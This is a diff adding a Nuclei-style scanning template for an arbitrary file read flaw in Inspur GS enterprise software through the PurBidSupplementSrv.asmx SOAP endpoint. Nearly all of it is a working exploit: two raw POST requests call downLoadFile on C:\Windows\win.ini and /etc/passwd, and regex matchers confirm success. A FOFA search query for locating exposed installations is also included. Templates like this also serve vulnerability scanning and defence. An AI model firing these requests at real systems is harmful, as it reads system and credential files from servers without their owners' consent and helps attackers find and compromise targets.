@@ -1,0 +1,63 @@
+id: inspur-PurBidSupplementSrv-fileread
+info:
+  name: 浪潮GS PurBidSupplementSrv.asmx任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/%E6%B5%AA%E6%BD%AEGS%20PurBidSupplementSrv.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: app="Inspur-GS企业管理" || title="TSCEV4.0" || body="cwbase/web/scripts/aes.js" || body="/cwbase/web/scripts/jquery.js" || body="ClusterEngine V4.0" || icon_hash="-1341069524"
+    tips:
+    repair:
+    version:
+  tags: fileread,inspur
+
+http:
+  - raw:  
+      - |
+        POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Cookie: GSPWebLanguageKey=zh-CN
+        Upgrade-Insecure-Requests: 1
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body xmlns:m="http://tempuri.org/">
+        <m:downLoadFile>
+        <m:filePath>C:\Windows\win.ini</m:filePath>
+        <m:offset>0</m:offset>
+        </m:downLoadFile>
+        </soap:Body>
+        </soap:Envelope>
+
+      - |
+        POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Cookie: GSPWebLanguageKey=zh-CN
+        Upgrade-Insecure-Requests: 1
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body xmlns:m="http://tempuri.org/">
+        <m:downLoadFile>
+        <m:filePath>/etc/passwd</m:filePath>
+        <m:offset>0</m:offset>
+        </m:downLoadFile>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
